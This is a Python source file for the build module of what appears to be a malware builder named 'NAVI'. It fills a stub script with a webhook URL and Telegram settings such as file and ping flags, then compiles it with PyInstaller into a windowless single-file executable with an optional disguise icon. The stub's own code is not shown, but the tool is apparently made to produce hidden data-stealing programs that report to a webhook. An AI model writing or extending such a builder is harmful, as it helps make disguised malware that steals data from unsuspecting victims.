import os
import subprocess
import shutil

class BuildManager:
    @staticmethod
    def buildFinal(compress, webhook_url, selected_payloads, file_name, file_type, file_icon_path, telegram_config, log):
        try:
            log("NAVI: initializing build...")
            
            stub_src = "modules/stub/recovery.py"
            if not os.path.exists(stub_src):
                log(f"NAVI: error - {stub_src} not found")
                return False
                
            with open(stub_src, 'r', encoding='utf-8') as f:
                content = f.read()
                
            log("NAVI: configuring stub...")
            
            webhook = telegram_config.get("webhook", "{{WEBHOOK}}") if telegram_config else "{{WEBHOOK}}"
            content = content.replace("{{WEBHOOK}}", webhook)
            
            if telegram_config:
                import re
                dbg_val = "True" if telegram_config.get("debugging", True) else "False"
                files_val = "True" if telegram_config.get("files", True) else "False"
                secure_val = "True" if telegram_config.get("security", False) else "False"
                ping_val = "True" if telegram_config.get("ping", True) else "False"
                
                content = re.sub(r'"dbg"\s*:\s*(True|False)', f'"dbg": {dbg_val}', content)
                content = re.sub(r'"files"\s*:\s*(True|False)', f'"files": {files_val}', content)
                content = re.sub(r'"secure"\s*:\s*(True|False)', f'"secure": {secure_val}', content)
                content = re.sub(r'"ping"\s*:\s*(True|False)', f'"ping": {ping_val}', content)
            
            
            if not os.path.exists('output'):
                os.makedirs('output')
                
            py_name = f"{file_name}.py"
            with open(py_name, 'w', encoding='utf-8') as f:
                f.write(content)
                
            log(f"NAVI: stub saved to {py_name}")
            
            if file_type == "exe":
                log("NAVI: compiling to exe...")
                cmd = [
                    "py", "-m", "PyInstaller",
                    "--onefile",
                    "--noconsole",
                    "--clean",
                    "--distpath", "./output",
                    "--name", os.path.basename(file_name)
                ]
                
                if file_icon_path and os.path.exists(file_icon_path):
                    cmd.extend(["--icon", file_icon_path])
                    
                cmd.append(py_name)
                
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    shell=True
                )
                
                for line in process.stdout:
                    if line.strip():
                        log(f"  {line.strip()}")
                        
                process.wait()
                
                if process.returncode == 0:
                    log(f"NAVI: success - output/{os.path.basename(file_name)}.exe")
                    # Cleanup build files
                    try:
                        shutil.rmtree('build', ignore_errors=True)
                        if os.path.exists(f"{os.path.basename(file_name)}.spec"):
                            os.remove(f"{os.path.basename(file_name)}.spec")
                    except:
                        pass
                    return True
                else:
                    log(f"NAVI: pyinstaller failed with code {process.returncode}")
                    return False
            else:
                log("NAVI: build finished (python stub only)")
                return True
                
        except Exception as e:
            log(f"NAVI: exception - {str(e)}")
            return False
